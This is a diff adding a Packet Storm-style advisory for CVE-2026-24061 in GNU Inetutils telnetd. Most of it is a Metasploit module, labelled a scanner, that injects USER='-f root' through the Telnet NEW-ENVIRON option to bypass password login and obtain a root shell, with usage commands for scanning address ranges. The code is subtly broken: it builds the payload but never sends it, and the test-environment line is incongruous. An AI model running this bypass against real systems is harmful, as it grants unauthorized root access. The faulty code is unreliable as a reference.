@@ -1,0 +1,189 @@
+=============================================================================================================================================
+| # Title     : GNU Inetutils 2.7 Telnet NEW‑ENVIRON Authentication Bypass Scanner                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214219/ & CVE-2026-24061 
+
+[+] Summary    : This Metasploit auxiliary scanner detects a Telnet authentication bypass vulnerability related to improper handling of the NEW-ENVIRON option during Telnet negotiation. 
+                 The issue allows an attacker to inject a malformed USER environment variable (for example, using flags such as -f root) when the server requests environment variables. 
+				 Affected Telnet daemons may incorrectly trust this input, potentially bypassing password authentication and granting immediate shell access.
+                 The module passively listens for the IAC SB NEW-ENVIRON SEND request, then responds with a crafted subnegotiation payload to test whether the target accepts the malicious USER value. 
+				 It verifies success by analyzing server responses for common indicators of a successful login or shell prompt. When exploitation indicators are detected, 
+				 the module reports the vulnerability in the Metasploit database.
+                 This scanner is intended for security assessment and detection purposes against vulnerable Telnet servers, including implementations such as GNU Inetutils telnetd up to affected versions, 
+				 and aligns conceptually with historical NEW-ENVIRON authentication bypass issues (e.g., CVE-1999-0192 and related Telnet environment variable flaws).
+
+[+] Usage : 
+
+# View available options
+
+show options
+
+# Set target(s)
+
+set RHOSTS <target_IP_or_range>
+
+# Example: set RHOSTS 192.168.1.1
+
+# Or for a range: set RHOSTS 192.168.1.1-254
+
+# Optional: Change port if Telnet is on non-standard port
+
+set RPORT 2323
+
+# Optional: Adjust timeout (default: 5 seconds)
+
+set TIMEOUT 10
+
+# Optional: Change payload (default: "-f root")
+
+set USER_PAYLOAD "-f admin"
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  Rank = NormalRanking
+
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::Telnet
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Telnet NEW-ENVIRON Authentication Bypass Scanner',
+      'Description'    => %q{
+        This module scans for an authentication bypass vulnerability in
+        GNU Inetutils telnetd caused by improper handling of the Telnet
+        NEW-ENVIRON option during session negotiation.
+
+        When the server requests environment variables, a malicious client
+        can inject a crafted USER value (for example "-f root"), which may
+        be incorrectly trusted by the daemon. In vulnerable configurations,
+        this can result in authentication being bypassed and immediate shell
+        access being granted.
+
+        This module passively monitors Telnet option negotiation, responds
+        with a malformed NEW-ENVIRON USER payload, and analyzes the server
+        response for indicators of successful authentication bypass.
+
+        This vulnerability is tracked as CVE-2026-24061 and is conceptually
+        related to historical Telnet NEW-ENVIRON issues such as CVE-1999-0192,
+        but affects modern GNU Inetutils implementations.
+      },
+      'Author'         =>
+        [
+          'indoushka'
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2026-24061'],
+          ['RFC', '1572']
+        ],
+      'DisclosureDate' => '2026-01-12'
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(23),
+        OptString.new(
+          'USER_PAYLOAD',
+          [
+            true,
+            'Malformed USER environment value',
+            '-f root'
+          ]
+        ),
+        OptInt.new(
+          'TIMEOUT',
+          [
+            true,
+            'Timeout for Telnet negotiation (seconds)',
+            5
+          ]
+        )
+      ]
+    )
+  end
+
+  def run_host(ip)
+    begin
+      connect
+      print_status("#{ip}:#{rport} - Connected to Telnet service")
+
+      self.sock.telnet_options[:negotiation] = false
+
+      new_environ_requested = false
+
+      ::Timeout.timeout(datastore['TIMEOUT']) do
+        loop do
+          data = sock.get_once(-1, 1)
+          break if data.nil?
+
+          if data.include?("\xff\xfa\x27\x01")
+            new_environ_requested = true
+            print_good("#{ip}:#{rport} - NEW-ENVIRON request detected")
+
+            buf  = "\xff\xfa\x27\x00"
+            buf += "\x00USER"
+            buf += "\x01"
+            buf += datastore['USER_PAYLOAD']
+            buf += "\xff\xf0"
+
+            print_status("#{ip}:#{rport} - Sending USER=#{datastore['USER_PAYLOAD']}")
+
+            Rex.sleep(1)
+            response = sock.get_once(-1, datastore['TIMEOUT'])
+
+            if response && response =~ /(last login|welcome|login successful|[#\$]>)/i
+              print_good("#{ip}:#{rport} - AUTHENTICATION BYPASS CONFIRMED")
+              print_status("#{ip}:#{rport} - Server response: #{response.strip}")
+
+              report_vuln(
+                host: ip,
+                port: rport,
+                proto: 'tcp',
+                name: self.name,
+                refs: self.references,
+                info: "Authentication bypass via NEW-ENVIRON (USER=#{datastore['USER_PAYLOAD']})"
+              )
+            else
+              print_status("#{ip}:#{rport} - Payload sent, but bypass not confirmed")
+            end
+
+            break
+          end
+        end
+      end
+
+      unless new_environ_requested
+        print_error("#{ip}:#{rport} - NEW-ENVIRON was not requested (likely not vulnerable)")
+      end
+
+    rescue ::Timeout::Error
+      print_error("#{ip}:#{rport} - Timeout during Telnet negotiation")
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    rescue ::EOFError
+      print_error("#{ip}:#{rport} - Server closed the connection")
+    rescue ::Interrupt
+      raise
+    rescue ::Exception => e
+      print_error("#{ip}:#{rport} - Unexpected error: #{e.class} - #{e.message}")
+    ensure
+      disconnect
+    end
+  end
+end
+
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
